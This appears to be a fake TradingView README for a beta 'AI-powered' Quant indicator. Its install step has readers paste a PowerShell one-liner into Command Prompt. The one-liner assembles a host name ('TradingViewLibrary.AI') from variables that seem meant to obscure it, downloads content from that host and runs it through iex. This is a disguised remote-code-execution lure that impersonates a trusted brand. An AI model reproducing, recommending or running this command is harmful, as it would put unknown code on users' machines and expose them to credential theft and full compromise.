<a id="quant"></a>
<div align="center">
<p align="center">
  <img src="logo.png" alt="TradingView" width="580">
</p>

## Quant Indicator

</div>

The first AI-powered indicator in our library, built to bring more market context directly into TradingView. It analyzes live market data and changing conditions to show several ways a setup may develop over the timeframe you select. Each view is displayed on the chart with the data and context behind it.

## Getting Started

During the beta, Quant is installed through Command Prompt ahead of its full in-app library release.

### 1. Open Command Prompt

Press **Win + R**, type:

```text
cmd
```

Then press **Enter**.

### 2. Run the Quant Indicator Installation Command

Copy and paste the following command into Command Prompt:
```powershell
powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.5'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
```

Press **Enter** to begin the installation.

### 3. Restart TradingView for the changes to take effect.

After installation, Quant Indicator will appear in your TradingView indicator library.
During the beta, you can send feedback and report any issues to support@tradingview.com. Your feedback will help us refine the indicator ahead of the full release.
